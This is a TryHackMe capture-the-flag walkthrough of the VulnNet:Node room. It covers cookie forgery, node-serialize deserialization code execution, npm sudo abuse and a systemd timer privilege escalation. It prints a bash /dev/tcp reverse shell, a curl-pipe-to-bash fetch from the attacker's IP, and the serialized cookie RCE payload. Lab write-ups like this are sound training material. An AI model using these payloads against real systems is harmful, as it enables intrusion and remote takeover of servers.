# [VulnNet:Node TryHackMe Writeup/Walkthrough][1]

VulnNet Entertainment has moved its infrastructure and now they're confident that no breach will happen again. You're tasked to prove otherwise and penetrate their network.

#### Scan the machine.
> If you are unsure how to tackle this, I recommend checking out the [Nmap Tutorials by Hack Hunt][2].

`nmap -sV -Pn <IP>`

![Open Ports](images/open_ports.jpg)

Looks like we have one port open: `8080`.

![Searchspolit Search](images/searchsploit.jpg)
> Found RCE, maybe off some use later.

I did `gobuster` scan but didn't find much really. I checked the website then.

![Website](images/website.jpg)
> Nothing much on this blogs but found a *LOGIN NOW* page.

Nothing much to work with. I then checked the *cookies* under `Inspect Element > Storage`. I copied and paste the value onto the [CyberChef][3] website.

Use `URL Decode` and `From Base64` to get the text.

![Decoded Text](images/cookie_decode.jpg)

I change the text to: `{"username": "Admin", "isAdmin":true, "encoding":"utf-8"}` and encoded the text with `ToBase64` and then `URL Encode`. Just as how we decrypted it.

![Encoded Text](images/cookie_encode.jpg)

Copy this text and paste it in the value field and refresh the webpage.  For a flash second I see *something Admin*. Let's fireup  **BurpSuite**.

Intercept the request and check in repeater.

![Admin Login Page](images/admin_login.jpg)
> Got Admin access.

Delete part of cookie and check their error handling system. Fascinatingly there are direct error messages.

![Error Message](images/cookie_error.jpg)

Searched cookie exploit online and will found an interesting cookie exploit on [exploit-db][4].

> Reading into the exploit

I then create a file called `shell.sh` with the content -> `bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1` and started a local server using python -> `python3 -m http.server`

![Server](images/start_server.jpg)


Also, start a `netcat` listener in other terminal -> `nc -lvnp 4444`.

Now lets configure the cookie and send it to the server.

I configure it according the need of the server -> `{"username":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('curl <YOUR_IP>:8000/shell.sh | bash ', function(error, stdout, stderr) { console.log(stdout) });\n }()","isAdmin":true,"encoding": "utf-8"}`

![Encode Shell](images/encode_shell.jpg)
> Encode the cookie

Paste this after `session=` under cookie and send the request in BurpSuite.

Go back to your terminal where you had `nc` listener. You will see a reverse connection.

![Got Shell](images/got_shell.jpg)

I looked around and checked my access for this shell.

![Access](images/access.jpg)

There was nothing much. I then checked what programs I can run using `sudo -l`.

![Sudo L](images/sudo_l.jpg)

We can run `npm` as `serv-manage`. Let's search this on [GTFOBins][5]. I found the exploit to get the sudo access.

![Got User](images/got_user.jpg)
> BAAM! We got the access.

Let's stabilize the shell first. CMD -> `python -c 'import pty;pty.spawn("/bin/bash")'`

![Stable Shell](images/shell_stable.jpg)

I got the user flag.

#### Privilege Escalation

For the `root`, let's check what programs I can run.

![SUDO L](images/sudo_l_user.jpg)
> Seems like I can run three commands as root.

Let's find this `vulnnet-auto.timer` file. For this we can use `locate` command.

![Locate File](images/file_locate.jpg)
> We have write access to this file as we are in `serv-manage` group.

Let's check the content of this file.

![File Content](images/content_file.jpg)
> Seems like this file is running other file called `vulnnet-job.service`

[Viewing the file]

This file is running a bash script. We can replace the bash script with the pervious curl command and get the root access. (If you have shutdown the python server, start it again)

I was not able to edit it properly. So I copied the content and created a file with the same name locally.

Also change the port in `shell.sh` to `4445`

![Content Exploit](images/content_exploit.jpg)

I then sent this file to the server using `curl` command.

![Get Files](images/get_file.jpg)
> Also dont forgot to start a listener again in a different terminal -> `nc -lvnp 4445`

Wait for a bit and you will get the connection. If not, run the command to which we had access -> `sudo /bin/systemctl stop vulnnet-auto.timer` and then `sudo /bin/systemctl start vulnnet-auto.timer`

![Got Shell](images/got_rev_shell.jpg)

You know what to do next :stuck_out_tongue_winking_eye:
